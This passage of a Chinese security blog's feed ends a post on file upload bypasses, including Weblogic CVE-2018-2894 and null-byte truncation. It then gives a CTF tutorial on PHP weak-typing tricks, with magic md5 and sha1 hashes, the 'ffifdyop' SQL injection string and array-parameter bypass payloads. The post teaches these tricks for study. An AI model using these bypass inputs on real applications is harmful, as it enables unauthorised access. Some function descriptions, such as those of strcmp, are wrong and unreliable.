将会是<span class="number">2</span>，所以最终拼接而成的 <span class="variable">$file_name</span> = <span class="number">2121</span>.php/.</span><br></pre></td></tr></table></figure><p>因此解析之后会自动忽略掉 <code>/.</code> ，则最终上传的文件名是 <code>2121.php</code></p><h2 id="9-4-Weblogic-任意文件上传漏洞（CVE-2018-2894）"><a href="#9-4-Weblogic-任意文件上传漏洞（CVE-2018-2894）" class="headerlink" title="9.4 Weblogic 任意文件上传漏洞（CVE-2018-2894）"></a>9.4 Weblogic 任意文件上传漏洞（CVE-2018-2894）</h2><p><a href="https://vulhub.org/#/environments/weblogic/CVE-2018-2894/">Weblogic 任意文件上传漏洞（CVE-2018-2894）</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br><span class="line">访问 http://192.168.254.110:7001/console</span><br><span class="line">查看管理员密码  docker-compose logs | grep password</span><br><span class="line">登录进去</span><br></pre></td></tr></table></figure><h1 id="十、补充"><a href="#十、补充" class="headerlink" title="十、补充"></a>十、补充</h1><h2 id="10-1-FIFES"><a href="#10-1-FIFES" class="headerlink" title="10.1 $_FIFES"></a>10.1 $_FIFES</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">二、$_FILES</span><br><span class="line">$_FILES数组内容：</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] 客户端文件的原名称</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] 文件的 MIME 类型</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;size&#x27;</span>] 上传文件的大小，单位为字节 </span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的</span><br><span class="line">$_FILES[<span class="string">&#x27;myFile&#x27;</span>][<span class="string">&#x27;error&#x27;</span>] 该文件上传相关的错误代码</span><br></pre></td></tr></table></figure><p><img src="https://image.3001.net/images/20191224/1577156449_5e017f6109e6e.png" alt="img"></p><h2 id="10-2-截断绕过"><a href="#10-2-截断绕过" class="headerlink" title="10.2 截断绕过"></a>10.2 截断绕过</h2><h3 id="00截断防御"><a href="#00截断防御" class="headerlink" title="00截断防御"></a>00截断防御</h3><ul><li>使用 <strong>$_FILES</strong>：由于传入的 <strong>$_FILES[‘name’]</strong> 已经是截断过后的，之后如果使用白名单去判断，显然是不能成功上传的。</li></ul><p><img src="https://i.loli.net/2021/06/06/1oe8KlkMph5DTJW.png" alt="image-20210326121425141"></p><ul><li>**isInvalid()**：可用于判断文件名是否合法，即不允许文件名当中含有 <strong>\0</strong>。如果文件名不合法，将抛出异常而退出流程。</li></ul><h3 id="转换字符集造成截断"><a href="#转换字符集造成截断" class="headerlink" title="转换字符集造成截断"></a>转换字符集造成截断</h3><p>条件：PHP版本 &lt; 5.4</p><p><code>iconv() </code>函数可以将一种已知的字符集文件转换成另一种已知的字符集文件。它的作用是在多种国际编码格式之间进行文本内码的转换。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;一、文件上传漏洞&quot;&gt;&lt;a href=&quot;#一、文件上传漏洞&quot; class=&quot;headerlink&quot; title=&quot;一、文件上传漏洞&quot;&gt;&lt;/a&gt;一、文件上传漏洞&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://i.loli.net/2021/06/06/xb6nmztdDVQK1OU.png&quot; alt=&quot;在这里插入图片描述&quot;&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight sql&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;成因：&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;服务器配置不当导致任意文件上传&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Web应用对上传的文件没有进行足够的限制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;程序开发部署时，由于未考虑系统特性或验证而导致限制被绕过&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="web" scheme="https://xizhi-future.github.io/categories/web/"/>
    
    <category term="文件上传" scheme="https://xizhi-future.github.io/categories/web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="Web" scheme="https://xizhi-future.github.io/tags/Web/"/>
    
    <category term="漏洞" scheme="https://xizhi-future.github.io/tags/%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="文件上传" scheme="https://xizhi-future.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>CTF之PHP</title>
    <link href="https://xizhi-future.github.io/2021/06/06/CTF%E4%B9%8BPHP/"/>
    <id>https://xizhi-future.github.io/2021/06/06/CTF%E4%B9%8BPHP/</id>
    <published>2021-06-06T14:42:17.000Z</published>
    <updated>2021-07-09T07:52:08.378Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://i.loli.net/2021/07/09/WFCqgPdOwSMG3iU.png" alt="image-20210405004401649"></p><span id="more"></span><h2 id="一、PHP-CTF"><a href="#一、PHP-CTF" class="headerlink" title="一、PHP CTF"></a>一、PHP CTF</h2><h3 id="1-1-PHP-弱类型"><a href="#1-1-PHP-弱类型" class="headerlink" title="1.1 PHP 弱类型"></a>1.1 PHP 弱类型</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">== 和 != 比较若类型不同，先偿试转换类型，再作值比较，最后返回值比较结果 。</span><br><span class="line">而</span><br><span class="line">=== 和 !== 只有在相同类型下,才会比较其值。</span><br></pre></td></tr></table></figure><ul><li><p>**== 与 ===**：== 不包括 <code>类型</code>，=== 包括 <code>类型</code></p><ul><li><p>**==**：遇到字符串与数值进行比较时，先将字符串类型转换成数值型，再进行比较</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">转换方法：</span><br><span class="line">如果该字符串没有包含&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;并且 其数值在整型的范围之内</span><br><span class="line">该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">&quot;admin&quot;</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;1admin&quot;</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;admin1&quot;</span>==<span class="number">1</span>)  <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">&quot;admin1&quot;</span>==<span class="number">0</span>)  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&quot;0e123456&quot;</span>==<span class="string">&quot;0e4456789&quot;</span>); <span class="comment">//true  科学技术法，0的无论多少次方都是0</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span> <span class="variable">$test</span>=<span class="number">1</span> + <span class="string">&quot;10.5&quot;</span>; <span class="comment">//$test=11.5(float)</span></span><br><span class="line"><span class="number">3</span> <span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;-1.3e3&quot;</span>; <span class="comment">//$test=-1299(float)</span></span><br><span class="line"><span class="number">4</span> <span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;bob-1.3e3&quot;</span>;<span class="comment">//$test=1(int)  开头部分是不合法的数值，字符串 转 整型0</span></span><br><span class="line"><span class="number">5</span> <span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;2admin&quot;</span>;<span class="comment">//$test=3(int)</span></span><br><span class="line"><span class="number">6</span> <span class="variable">$test</span>=<span class="number">1</span>+<span class="string">&quot;admin2&quot;</span>;<span class="comment">//$test=1(int)</span></span><br><span class="line"><span class="number">7</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>**===**：首先判断二者 类型是否相同，若不同直接为0，若类型相同，再比较数值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(a===<span class="number">0</span>);  <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="number">1</span>===<span class="number">1</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&#x27;qw&#x27;</span>===<span class="number">1</span>);  <span class="comment">//false</span></span><br><span class="line"><span class="comment">//注意：</span></span><br><span class="line">var_dump(<span class="string">&#x27;000&#x27;</span>===<span class="number">0</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">&#x27;a&#x27;</span>===a);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">&#x27;1&#x27;</span>===<span class="number">1</span>);  <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">&quot;QNKCDZO&quot;</span> !== <span class="string">&quot;s878926199a&quot;</span>);<span class="comment">//true</span></span><br><span class="line">var_dump(md5(<span class="string">&quot;QNKCDZO&quot;</span>) === md5(<span class="string">&quot;s878926199a&quot;</span>));<span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">&quot;0e830400451993494058024219903391&quot;</span> === <span class="string">&quot;0e545993274517709034328855841020&quot;</span>);<span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">&quot;0&quot;</span> === <span class="number">0</span>);<span class="comment">///false</span></span><br><span class="line">var_dump(<span class="string">&quot;01a&quot;</span> === <span class="number">0</span>);<span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>如果一个数值和一个字符串比较，那么会将字符串转换为数值</strong></p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">‘’ == <span class="number">0</span> == <span class="literal">false</span></span><br><span class="line"><span class="string">&#x27;123&#x27;</span> == <span class="number">123</span></span><br><span class="line"><span class="string">&#x27;abc&#x27;</span> == <span class="number">0</span></span><br><span class="line"><span class="string">&#x27;123a&#x27;</span> == <span class="number">123</span> </span><br><span class="line"><span class="string">&#x27;0x01&#x27;</span> == <span class="number">1</span></span><br><span class="line"><span class="string">&#x27;0e123456789&#x27;</span> == <span class="string">&#x27;0e987654321&#x27;</span> </span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line"><span class="literal">true</span> == <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li><strong>如果 switch是数字类型的case判断时，switch会将其中的参数转换为int类型</strong></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$i</span> = <span class="string">&quot;3name&quot;</span>;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$i</span>)&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;two&quot;</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;flag&quot;</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">最终的结果是 flag</span><br></pre></td></tr></table></figure><ul><li><p><strong>strcmp()问题</strong>：<strong>比较两个字符串，不区分大小写</strong>，<code>strcmp(string $tr1,string $str2)函数是将两个字符串转换成Ascii之后去进行比较的，相同为1，不同为0</code>，若<code>string1 &gt; string2</code>，返回<code>&gt; 0</code>；若<code>string1 &lt; string2</code>，返回<code>&lt; 0</code>;若<code>string1 = string2</code>，返回<code>0</code></p><ul><li><p><strong>strcasecmp(string1, string2)<strong>：</strong>比较两个字符串，区分大小写</strong></p></li><li><p>这两个函数无法处理数组，当出现数组时，返回<code>null</code>。(下例中@表示忽略警告)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(@strcmp([],<span class="string">&#x27;asd&#x27;</span>)==<span class="number">0</span>);   <span class="comment">//true</span></span><br><span class="line">var_dump(@strcmp([],<span class="string">&#x27;asd&#x27;</span>)===<span class="number">0</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(strcmp(<span class="literal">NULL</span>,<span class="string">&#x27;asd&#x27;</span>)==<span class="number">0</span>);<span class="comment">//false</span></span><br><span class="line">var_dump(@strcmp([],<span class="string">&#x27;asd&#x27;</span>));<span class="comment">//NULL</span></span><br><span class="line">var_dump(@strcmp([],<span class="number">123</span>));<span class="comment">//NULL</span></span><br><span class="line"><span class="keyword">if</span>(<span class="literal">NULL</span>==<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;123&quot;</span>;<span class="comment">//123</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>is_numeric() 函数</strong>：判断变量是否为数字，是数字返回1，否则返回0</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">1</span>);<span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;1&#x27;</span>);<span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="number">0x1</span>);<span class="comment">//1</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;0x1&#x27;</span>);<span class="comment">//1</span></span><br><span class="line">var_dump(is_numeric([<span class="number">123</span>]));<span class="comment">//false</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&#x27;123&#x27;</span>));  <span class="comment">//true</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&#x27;0x1&#x27;</span>));<span class="comment">//bool(true)</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&#x27;1a&#x27;</span>));<span class="comment">//bool(false)</span></span><br><span class="line">var_dump(is_numeric([<span class="number">1</span>]));<span class="comment">//bool(false)</span></span><br><span class="line"><span class="keyword">echo</span> is_numeric(<span class="string">&#x27;0e1&#x27;</span>);<span class="comment">//1</span></span><br><span class="line">var_dump(is_numeric(<span class="string">&#x27;0ea&#x27;</span>));<span class="comment">//bool(false)</span></span><br></pre></td></tr></table></figure></li><li><p><strong>in_array() 问题</strong>：<code>in_array(search,array,type)</code>，返回 bool</p></li><li><p><strong>array_search() 问题</strong>：<code>在数组中搜索某个键值，并返回对应的键名</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">在数组中搜索键值 <span class="string">&quot;red&quot;</span>，并返回它的键名：</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>=&gt;<span class="string">&quot;red&quot;</span>,<span class="string">&quot;b&quot;</span>=&gt;<span class="string">&quot;green&quot;</span>,<span class="string">&quot;c&quot;</span>=&gt;<span class="string">&quot;blue&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> array_search(<span class="string">&quot;red&quot;</span>,<span class="variable">$a</span>);  <span class="comment">//输出的是 a</span></span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">&quot;red&quot;</span>,<span class="variable">$a</span>)==a)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;success&quot;</span>;<span class="comment">//将会输出 success</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>例题：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;qwewqeqwd&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_array(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]))&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; count(<span class="variable">$test</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$test</span>[<span class="variable">$i</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span>[<span class="variable">$i</span>] = intval(<span class="variable">$test</span>[<span class="variable">$i</span>]);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">&#x27;admin&#x27;</span>,<span class="variable">$test</span>)===<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;false&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    分析：=== 为 <span class="number">0</span> ，最简单的办法就是，两边类型不相同</span><br><span class="line">WP：?test[]=<span class="number">0</span> 或 ?test[<span class="number">0</span>]=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p><strong>strpos() 问题</strong>：<code>strpos(string,find,start)返回从 start开始，string中 find第一次出现的位置</code>，位置是从0开始的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var_dump(strpos(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;a&#x27;</span>));   <span class="comment">//int(0) bool(true) </span></span><br><span class="line">var_dump(strpos(<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)===<span class="number">0</span>);<span class="comment">//bool(true) </span></span><br></pre></td></tr></table></figure></li><li><p><strong>数组比较</strong>：php手册中写道，当数组(array)与任何非数组进行比较时，数组总是最大的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump([]&gt;<span class="number">0</span>);<span class="comment">//bool(true)</span></span><br><span class="line">var_dump([]&gt;<span class="number">9999</span>);<span class="comment">//bool(true)</span></span><br><span class="line">var_dump([]&gt;<span class="string">&#x27;a&#x27;</span>);<span class="comment">//bool(true) #数组大于字符串</span></span><br><span class="line">var_dump([[]]&gt;[]);<span class="comment">//bool(true)  #自然二位数组大于一维数组</span></span><br></pre></td></tr></table></figure></li><li><p><strong>bool类型的true比较</strong>：bool类型的true跟任意字符可以弱类型相等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(<span class="literal">true</span> == <span class="string">&#x27;a&#x27;</span>);<span class="comment">//bool(true)</span></span><br></pre></td></tr></table></figure></li><li><p>**md5() 与 sha1()**：<a href="https://www.w3school.com.cn/php/func_string_md5.asp">md5(string,raw)</a></p><p><img src="https://i.loli.net/2021/05/31/wYZ1ENSA7huVgIM.png" alt="image-20210531150621396"></p><ul><li>md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sha1([]) === <span class="literal">false</span></span><br><span class="line">md5([]) === <span class="literal">false</span></span><br></pre></td></tr></table></figure><ul><li><p><strong>md5 绕过 ==</strong> ：由于md5值开头均为 <code>0e</code> 的数或字符串，对  <code>==</code> 来说是相同的（都是0）；对<code>===</code>来说，类型不同则不同。<a href="https://www.cnblogs.com/apolloren/p/14139516.html">md5 值是 0e 开头的总结</a></p></li><li><p>**md5 绕过 ===**：由于md5()函数不能处理数组，所以在md5()遇到数组时会警告并且返回null，然而可以忽略警告并通过数组绕过<code>===</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(@md5([]) == @md5([]))//bool(true)</span><br><span class="line">var_dump(@md5([]) === @md5([]))//bool(true)，@表示忽略警告</span><br><span class="line">var_dump(null === null);//bool(true)</span><br></pre></td></tr></table></figure></li><li><p><strong>md5 绕过 sql</strong> ：md5 和 sha1 支持第二个参数，如果为 true，则会将 hash 后的 16 进制字符串以 16 进制转成字符串的形式返回，如果在 SQL 语句中这样写，会存在注入的问题。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">提供一个字符串：ffifdyop，md5后，<span class="number">276</span>f722736c95d99e921722cf9ed621c</span><br><span class="line">再转成字符串：<span class="string">&#x27;or&#x27;</span><span class="number">6</span>É]™é<span class="operator">!</span>r,ùíb，即md5(<span class="string">&#x27;ffifdyop&#x27;</span>,<span class="literal">true</span>) <span class="operator">=</span><span class="string">&#x27;or&#x27;</span><span class="number">6</span>É]™é<span class="operator">!</span>r,ùíb</span><br><span class="line"></span><br><span class="line">  <span class="operator">/</span><span class="operator">/</span> 可以实现绕过</span><br><span class="line">  $password <span class="operator">=</span> &quot;ffifdyop&quot;;</span><br><span class="line">  $<span class="keyword">sql</span> <span class="operator">=</span> &quot;SELECT * FROM admin WHERE pass = &#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;;</span><br><span class="line">  var_dump($<span class="keyword">sql</span>);</span><br></pre></td></tr></table></figure></li><li><p>**sha1()**：列出 sha1() 开头是 0e的字符串</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sha1(<span class="string">&#x27;aaroZmOk&#x27;</span>)<span class="operator">/</span><span class="operator">/</span><span class="number">0e66507019969427134894567494305185566735</span></span><br><span class="line">sha1(<span class="string">&#x27;aaK1STfY&#x27;</span>)<span class="operator">/</span><span class="operator">/</span><span class="number">0e76658526655756207688271159624026011393</span></span><br><span class="line">sha1(<span class="string">&#x27;aaO8zKZF&#x27;</span>)<span class="operator">/</span><span class="operator">/</span><span class="number">0e89257456677279068558073954252716165668</span></span><br><span class="line">sha1(<span class="string">&#x27;aa3OFF9m&#x27;</span>)<span class="operator">/</span><span class="operator">/</span><span class="number">0e36977786278517984959260394024281014729</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>preg_match()</strong></p><p><img src="C:\Users\yinanping\AppData\Roaming\Typora\typora-user-images\image-20210423192440929.png" alt="image-20210423192440929"></p><p>返回 <code>pattern</code> 的匹配次数。  它的值将是0次（不匹配）或1次，因为**preg_match()<strong>在第一次匹配后  将会停止搜索。<a href="https://www.php.net/manual/zh/function.preg-match-all.php">preg_match_all()</a>不同于此，它会一直搜索<code>subject</code>  直到到达结尾。   如果发生错误</strong>preg_match()**返回 **<code>false</code>**。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(intval(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#WP:?num[]=1</span></span><br><span class="line"><span class="comment">#当不按照正确的方式传参数时，将会认为是错误，而自动跳过正则的检查</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="1-2-PHP-变量覆盖"><a href="#1-2-PHP-变量覆盖" class="headerlink" title="1.2 PHP 变量覆盖"></a>1.2 PHP 变量覆盖</h3><p><a 